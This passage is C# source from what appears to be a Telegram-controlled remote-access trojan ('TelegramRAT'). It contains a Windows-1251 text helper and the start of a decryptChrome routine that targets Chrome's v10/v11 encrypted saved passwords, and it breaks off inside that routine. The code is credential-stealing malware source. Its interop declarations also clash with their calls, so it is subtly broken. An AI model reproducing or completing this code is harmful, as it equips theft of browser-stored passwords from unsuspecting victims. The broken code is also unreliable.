using System.Text;
using System.Runtime.InteropServices;

namespace TelegramRAT
{
    internal static class Win1251
    {
        private const int CP1251 = 1251;

        [DllImport("kernel32", CharSet = CharSet.Auto)]
        private static extern int MultiByteToWideChar(int CodePage, int dwFlags, string lpMultiByteStr, int cbMultiByte, [Out] char[] lpWideCharStr, int cchWideChar);

        [DllImport("kernel32", CharSet = CharSet.Auto)]
        private static extern int WideCharToMultiByte(int CodePage, int dwFlags, char[] lpWideCharStr, int cchWideChar, StringBuilder lpMultiByteStr, int cbMultiByte, int lpDefaultChar, int lpUsedDefaultChar);

        private static byte[] win1251Bytes;

        static Win1251()
        {
            string win1251Text = "Русский текст";
            win1251Bytes = Encoding.GetEncoding(CP1251).GetBytes(win1251Text);
        }

        public static string GetString(byte[] bytes)
        {
            int byteCount = bytes.Length;
            int wideCharCount = MultiByteToWideChar(CP1251, 0, bytes, byteCount, null, 0);
            char[] wideChars = new char[wideCharCount];
            MultiByteToWideChar(CP1251, 0, bytes, byteCount, wideChars, wideCharCount);
            int multiByteCount = WideCharToMultiByte(CP1251, 0, wideChars, wideCharCount, null, 0, null, null);
            byte[] resultBytes = new byte[multiByteCount];
            WideCharToMultiByte(CP1251, 0, wideChars, wideCharCount, resultBytes, multiByteCount, null, null);
            return Encoding.UTF8.GetString(resultBytes);
        }
    }

    internal static class Crypt
    {
        // Convert Windows 1251 encoded text to UTF-8 encoded text
        public static string toUTF8(string text)
        {
            return Win1251.GetString(Encoding.Default.GetBytes(text));
        }

        // Decrypt value from Chrome > 80 version.
        public static string decryptChrome(string password, string browser = "")
        {
            // If Chromium version > 80
            if (password.StartsWith("v10") || password.StartsWith("v11"))
